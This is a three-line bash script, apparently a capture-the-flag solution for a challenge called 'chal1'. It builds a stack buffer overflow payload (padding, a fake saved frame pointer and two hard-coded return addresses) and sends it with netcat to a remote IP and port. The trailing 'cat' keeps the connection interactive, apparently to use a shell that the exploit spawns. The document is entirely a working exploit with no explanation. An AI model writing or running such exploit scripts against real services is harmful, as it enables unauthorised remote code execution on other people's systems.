#!/bin/bash
python -c 'print(32*"A"+"BBBBBBBB"+"\x7f\x08\x40\x00\x00\x00\x00\x00\x6d\x08\x40\x00\x00\x00\x00\x00")' > input_chal1
(cat input_chal1; cat) | nc 46.101.107.117 2102